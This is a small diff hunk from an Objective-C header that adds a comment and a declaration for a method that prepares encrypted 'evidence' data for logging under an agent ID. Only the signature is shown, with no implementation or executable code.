@@ -83,6 +83,11 @@ enum {
 
 - (void)updateLogQueue;
 
+
+// jo
+// create an encrypted data to be logged as a proxy evidence
+- (NSMutableData *)prepareDataToLog: (NSMutableData *) evidenceData evidenceHeader: (NSData *)anEvidenceHeader forAgentID: (u_int)logID;
+
 //
 // @author
 //  revenge
